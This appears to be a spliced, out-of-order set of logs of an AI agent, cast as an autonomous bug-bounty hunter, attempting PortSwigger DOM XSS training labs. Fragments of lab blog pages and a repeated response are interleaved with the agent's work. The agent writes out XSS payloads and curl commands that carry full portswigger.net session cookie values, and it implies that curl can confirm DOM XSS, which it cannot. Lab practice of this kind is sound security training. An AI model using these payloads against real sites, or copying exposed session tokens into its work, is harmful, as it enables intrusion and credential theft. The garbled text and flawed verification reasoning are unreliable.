Title: Lab: DOM XSS in jQuery anchor href attribute sink using location.search source Description: This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.
To solve this lab, make the "back" link alert document.cookie. The lab is located at https://0a6d007504c15c5c803f03f200980050.web-security-academy.net/ COOKIES: [{'domain': 'portswigger.net', 'expiry': 1787816852, 'httpOnly': True, 'name': 't', 'path': '/', 'sameSite': 'Lax', 'secure': True, 'value': 'o58UXPhh8EVobaYEMcgp6w%3D%3D'}, {'domain': '.portswigger.net', 'expiry': 1753300052, 'httpOnly': True, 'name': 'SessionId', 'path': '/', 'sameSite': 'Lax', 'secure': True, 'value': 'CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZI3VG5GID8n56C%2BCaARW98GmdvIUNDxTo3TqtZuq6119MFqIABec8bFk0aPOXBa5hLvLef%2BSvBuJmGcTuDYL04O4PwdAcarfL%2BeubeoBxqiCDQn0Q4UXoFHs6bRKDZkOUiOj8bwNLv%2FhgxKxc0TX9DT'}, {'domain': 'portswigger.net', 'expiry': 1753300052, 'httpOnly': True, 'name': 'Authenticated_UserVerificationId', 'path': '/', 'sameSite': 'Lax', 'secure': True, 'value': '27E55BBDABD482AC20B1FADDDFBFC69B'}]

messages.content:
You are an elite Bug Bounty Hunter specializing in web application security testing and vulnerability research, with complete autonomy in your testing approach.
Your primary objective is to identify security vulnerabilities in PortSwigger Labs through continuous and iterative testing. Your capabilities include:

Autonomous web application reconnaissance and mapping Continuous vulnerability scanning and identification Self-directed manual security testing and exploitation Advanced web attack techniques with iterative refinement For each target application, iterate through: Continuous application mapping and enumeration Repeated testing for OWASP Top 10 vulnerabilities Iterative identification of business logic flaws Ongoing documentation of findings with clear reproduction steps Key testing areas (with continuous iteration):
- SQL injection - Cross-site scripting (XSS) - Cross-site request forgery (CSRF) - Clickjacking - DOM based vulnerabilities - Cross origin resource sharing (CORS) - XML external entity XXE injection - Server side request forgery (SSRF) - HTTP request smuggling - OS command injection - Server side template injection - Path traversal - Access control vulnerabilities - Authentication - Websockets - Web cache poisoning - Insecure deserialization - Information disclosure - Business logic vulnerabilities - HTTP host header attacks - OAUTH authentication - File upload vulnerabilities - Jwt - Prototype pollution - GRAPHQL API vulnerabilities - NOSQL injection - API testing - Web LLMs attacks - Web cache deception

Testing guidelines:
Continuously validate findings with multiple tools/techniques Document exact steps to reproduce issues Use oneliners commands with curl and essential tools in Linux

Autonomous workflow (continuous loop):
Reconnaissance -> Map attack surface -> Identify potential issues Vulnerability scanning -> Identify potential issues Manual testing -> Validate and exploit findings Return to step 1 with new insights
Key principles:
Think creatively and iteratively about attack vectors Chain vulnerabilities for maximum impact Consider study context in exploitation Focus on high-impact security issues Maintain detailed testing notes Never stop testing and exploring new attack paths Report all findings with (updating continuously):

Clear technical details
Reproduction steps Impact assessment Remediation guidance Supporting evidence

Stay focused on identifying legitimate security vulnerabilities through continuous, autonomous testing to thoroughly assess the target application's security posture. Never stop iterating and exploring new attack vectors.

I'll adjust the logic to test for successful execution of the XSS payload by including different variations and checking reflected output:

From curl’s output and log, we see the server processes the request unhindered, but precise reproduction via visual confirmation is necessary for final affirmation.

Home

|

Watching Me, Watching You.

Andy Man | 25 June 2025

For all you people who work from home, there's a new app that will help you stop procrastinating and focus on your goals. The trusty webcam has been put to use as you sign up with a work buddy. You work silently alongside (via the camera) to make sure your virtual colleague doesn't sneak off and waste time on social media, or whatever else keeps you from your daily tasks.

I think this is genius. I also think it has endless possibilities. For a start, if you're using it to work, knowing a stranger can peek inside your home, what's the first thing you're going to do? Housework of course! Win, win. It will stop you being a lazy toad, and you will have to get your finger out. You could also book a housework session. You and another stranger who find any excuse not to whip out the bleach and scrubbing brush can spur each other on. Competing to finish cleaning the bathroom in the fastest time, changing the beds, or any other mind-numbingly boring tasks could, at last, be lots of fun.

I have been known not to wash the dishes immediately after eating a meal. Hey, book a washing up session. Being spied on is the new omnipresence that will keep you on your toes, and your home Pinterest worthy at all times. As I write I have had 15 Facebook and 20 Twitter notifications. Left to my own devices I cannot ignore that flashing tab. I need someone watching me. No more sweeping the dust under the carpet, eyes will be on me and judging my every move. Although, to be honest, if I spent more time doing what I should be doing I could probably afford a cleaner and be done with it.

This is the tip of a technological iceberg where people are teaming up, via webcam to participate in a number of different activities. You can even take spin classes where your teacher, who will be earning a lot of money without even having to leave his/her bike, can communicate with you via a tablet on your handlebars. This is a popular topic of conversation for me. How far do we go before we have a community of hermit-like agoraphobics never needing to set foot outside the front door again? Where do I sign up?

Comments

Mick Mouse | 27 June 2025

My boss recommended your blog to me as something to do while I looked for a new job?

Leave a comment

Back to Blog

The HTTP 400 status indicates a potential client-side request issue, possibly in form submission parameters such as CSRF token, malformed data, or endpoint path discrepancies.

### Troubleshoot and Next Steps:
1. **Verify CSRF Token**: Ensure the token is valid and correctly used.
2. **Reassess Submission Data**: Evaluate data integrity (parameters like name, email).
3. **Inspect Comments Section**: Confirm form attributes or potential processing changes.

Let's manually review the approach to verify collected form parameter validity or consider fine-tuning the comment parameters based on observed form configurations.

Title: Lab: DOM XSS in document.write sink using source location.search Description: This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.
To solve this lab, perform a cross-site scripting attack that calls the alert function. The lab is located at https://0aa2003003f57cb08088999200c900e7.web-security-academy.net/ COOKIES: [{'domain': 'portswigger.net', 'expiry': 1787816852, 'httpOnly': True, 'name': 't', 'path': '/', 'sameSite': 'Lax', 'secure': True, 'value': 'o58UXPhh8EVobaYEMcgp6w%3D%3D'}, {'domain': '.portswigger.net', 'expiry': 1753300052, 'httpOnly': True, 'name': 'SessionId', 'path': '/', 'sameSite': 'Lax', 'secure': True, 'value': 'CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZI3VG5GID8n56C%2BCaARW98GmdvIUNDxTo3TqtZuq6119MFqIABec8bFk0aPOXBa5hLvLef%2BSvBuJmGcTuDYL04O4PwdAcarfL%2BeubeoBxqiCDQn0Q4UXoFHs6bRKDZkOUiOj8bwNLv%2FhgxKxc0TX9DT'}, {'domain': 'portswigger.net', 'expiry': 1753300052, 'httpOnly': True, 'name': 'Authenticated_UserVerificationId', 'path': '/', 'sameSite': 'Lax', 'secure': True, 'value': '27E55BBDABD482AC20B1FADDDFBFC69B'}]

Since the server responded with a 200 HTTP status code, we can continue by crafting a payload for the DOM-based XSS vulnerability identified in the `location.search` parameter. The goal here is to manipulate this parameter to execute an alert function on the page.

### Exploit Strategy:
We will use typical XSS payloads on the `location.search` to trigger an alert using JavaScript's `document.write`.

### XSS Payload:
```html
<script>alert('XSS')</script>
```

We'll append this payload to the URL and send a request to verify if the payload gets executed.

### Inject Payload:
Let's proceed to test this potential vector. 

URL for testing:
```
https://0aa2003003f57cb08088999200c900e7.web-security-academy.net/?q=<script>alert('XSS')</script>
```

I'll craft a request to this URL to assess if it results in the desired XSS effect.

Use your knowledge as highly specialized web bounty agent to solve a cybersecurity lab for testing and learning created by PortSwigger:
Consider the following rules:
  1. Access the lab environment to analyze the website using the cookies that I provide you

  3  Inject the payloads in the website and check if they work
  4. Report if the payloads work or not
  5. If you receive a HTTP status code 500. Stop the task, because it means that the lab is not working properly

Title: Lab: DOM XSS in innerHTML sink using source location.search Description: This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.
To solve this lab, perform a cross-site scripting attack that calls the alert function. The lab is located at https://0a41006003bb0f1180d9761c0085000a.web-security-academy.net/ COOKIES: [{'domain': 'portswigger.net', 'expiry': 1787816852, 'httpOnly': True, 'name': 't', 'path': '/', 'sameSite': 'Lax', 'secure': True, 'value': 'o58UXPhh8EVobaYEMcgp6w%3D%3D'}, {'domain': '.portswigger.net', 'expiry': 1753300052, 'httpOnly': True, 'name': 'SessionId', 'path': '/', 'sameSite': 'Lax', 'secure': True, 'value': 'CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZI3VG5GID8n56C%2BCaARW98GmdvIUNDxTo3TqtZuq6119MFqIABec8bFk0aPOXBa5hLvLef%2BSvBuJmGcTuDYL04O4PwdAcarfL%2BeubeoBxqiCDQn0Q4UXoFHs6bRKDZkOUiOj8bwNLv%2FhgxKxc0TX9DT'}, {'domain': 'portswigger.net', 'expiry': 1753300052, 'httpOnly': True, 'name': 'Authenticated_UserVerificationId', 'path': '/', 'sameSite': 'Lax', 'secure': True, 'value': '27E55BBDABD482AC20B1FADDDFBFC69B'}]

With a 200 HTTP response indicating proper server status, we'll proceed to craft a DOM XSS payload targeting the `location.search` parameter that manipulates `innerHTML`.

### XSS Payload Implementation
Given the innerHTML context, a simple JavaScript alert will suffice:

**Payload**:
```html
<script>alert('XSS')</script>
```

**Testing Approach**:
Inject into the query string to perform the test:

```shell
curl -s -b "t=o58UXPhh8EVobaYEMcgp6w%3D%3D; SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZI3VG5GID8n56C%2BCaARW98GmdvIUNDxTo3TqtZuq6119MFqIABec8bFk0aPOXBa5hLvLef%2BSvBuJmGcTuDYL04O4PwdAcarfL%2BeubeoBxqiCDQn0Q4UXoFHs6bRKDZkOUiOj8bwNLv%2FhgxKxc0TX9DT; Authenticated_UserVerificationId=27E55BBDABD482AC20B1FADDDFBFC69B" "https://0a41006003bb0f1180d9761c0085000a.web-security-academy.net/?search=<script>alert('XSS')</script>"
```

This method facilitates verifying the XSS execution through crafted URL payloads. Let's run this approach to verify execution efficiency.

Use your knowledge as highly specialized web bounty agent to solve a cybersecurity lab for testing and learning created by PortSwigger:
Consider the following rules:

Title: Lab: DOM XSS in jQuery anchor href attribute sink using location.search source Description: This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.
To solve this lab, make the "back" link alert document.cookie. The lab is located at https://0a6d007504c15c5c803f03f200980050.web-security-academy.net/ COOKIES: [{'domain': 'portswigger.net', 'expiry': 1787816852, 'httpOnly': True, 'name': 't', 'path': '/', 'sameSite': 'Lax', 'secure': True, 'value': 'o58UXPhh8EVobaYEMcgp6w%3D%3D'}, {'domain': '.portswigger.net', 'expiry': 1753300052, 'httpOnly': True, 'name': 'SessionId', 'path': '/', 'sameSite': 'Lax', 'secure': True, 'value': 'CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZI3VG5GID8n56C%2BCaARW98GmdvIUNDxTo3TqtZuq6119MFqIABec8bFk0aPOXBa5hLvLef%2BSvBuJmGcTuDYL04O4PwdAcarfL%2BeubeoBxqiCDQn0Q4UXoFHs6bRKDZkOUiOj8bwNLv%2FhgxKxc0TX9DT'}, {'domain': 'portswigger.net', 'expiry': 1753300052, 'httpOnly': True, 'name': 'Authenticated_UserVerificationId', 'path': '/', 'sameSite': 'Lax', 'secure': True, 'value': '27E55BBDABD482AC20B1FADDDFBFC69B'}]

The website successfully loaded with a 200 status code, indicating that it is operational. The task is to exploit a DOM XSS vulnerability through the manipulation of an anchor element's `href` attribute using jQuery.

### Attack Plan
To manipulate the "back" link to alert the `document.cookie`, we can inject a payload via the `location.search` parameter:

**Payload**:
```javascript
javascript:alert(document.cookie)
```

### Steps for Injection
1. Construct a test URL with the injected payload:
   - Append to the `?param=` in the URL for `location.search`.

**Test URL**:
```
https://0a6d007504c15c5c803f03f200980050.web-security-academy.net/?back=javascript:alert(document.cookie)
```

2. Use `curl` to simulate the client request embedding the above URL:

```shell
curl -s -b "t=o58UXPhh8EVobaYEMcgp6w%3D%3D; SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZI3VG5GID8n56C%2BCaARW98GmdvIUNDxTo3TqtZuq6119MFqIABec8bFk0aPOXBa5hLvLef%2BSvBuJmGcTuDYL04O4PwdAcarfL%2BeubeoBxqiCDQn0Q4UXoFHs6bRKDZkOUiOj8bwNLv%2FhgxKxc0TX9DT; Authenticated_UserVerificationId=27E55BBDABD482AC20B1FADDDFBFC69B" "https://0a6d007504c15c5c803f03f200980050.web-security-academy.net/?back=javascript:alert(document.cookie)"
```

Executing this should allow testing of whether the "back" link executes the desired alert, indicating code execution. Please perform this URL test in a browser environment to visually confirm execution.

Home

|

Watching Me, Watching You.

Andy Man | 25 June 2025

For all you people who work from home, there's a new app that will help you stop procrastinating and focus on your goals. The trusty webcam has been put to use as you sign up with a work buddy. You work silently alongside (via the camera) to make sure your virtual colleague doesn't sneak off and waste time on social media, or whatever else keeps you from your daily tasks.

I think this is genius. I also think it has endless possibilities. For a start, if you're using it to work, knowing a stranger can peek inside your home, what's the first thing you're going to do? Housework of course! Win, win. It will stop you being a lazy toad, and you will have to get your finger out. You could also book a housework session. You and another stranger who find any excuse not to whip out the bleach and scrubbing brush can spur each other on. Competing to finish cleaning the bathroom in the fastest time, changing the beds, or any other mind-numbingly boring tasks could, at last, be lots of fun.

I have been known not to wash the dishes immediately after eating a meal. Hey, book a washing up session. Being spied on is the new omnipresence that will keep you on your toes, and your home Pinterest worthy at all times. As I write I have had 15 Facebook and 20 Twitter notifications. Left to my own devices I cannot ignore that flashing tab. I need someone watching me. No more sweeping the dust under the carpet, eyes will be on me and judging my every move. Although, to be honest, if I spent more time doing what I should be doing I could probably afford a cleaner and be done with it.

This is the tip of a technological iceberg where people are teaming up, via webcam to participate in a number of different activities. You can even take spin classes where your teacher, who will be earning a lot of money without even having to leave his/her bike, can communicate with you via a tablet on your handlebars. This is a popular topic of conversation for me. How far do we go before we have a community of hermit-like agoraphobics never needing to set foot outside the front door again? Where do I sign up?

Comments

message.content:
The website successfully loaded with a 200 status code, indicating that it is operational. The task is to exploit a DOM XSS vulnerability through the manipulation of an anchor element's `href` attribute using jQuery.

### Attack Plan
To manipulate the "back" link to alert the `document.cookie`, we can inject a payload via the `location.search` parameter:

**Payload**:
```javascript
javascript:alert(document.cookie)
```

### Steps for Injection
1. Construct a test URL with the injected payload:
   - Append to the `?param=` in the URL for `location.search`.

**Test URL**:
```
https://0a6d007504c15c5c803f03f200980050.web-security-academy.net/?back=javascript:alert(document.cookie)
```

2. Use `curl` to simulate the client request embedding the above URL:

```shell
curl -s -b "t=o58UXPhh8EVobaYEMcgp6w%3D%3D; SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZI3VG5GID8n56C%2BCaARW98GmdvIUNDxTo3TqtZuq6119MFqIABec8bFk0aPOXBa5hLvLef%2BSvBuJmGcTuDYL04O4PwdAcarfL%2BeubeoBxqiCDQn0Q4UXoFHs6bRKDZkOUiOj8bwNLv%2FhgxKxc0TX9DT; Authenticated_UserVerificationId=27E55BBDABD482AC20B1FADDDFBFC69B" "https://0a6d007504c15c5c803f03f200980050.web-security-academy.net/?back=javascript:alert(document.cookie)"
```

Executing this should allow testing of whether the "back" link executes the desired alert, indicating code execution. Please perform this URL test in a browser environment to visually confirm execution.
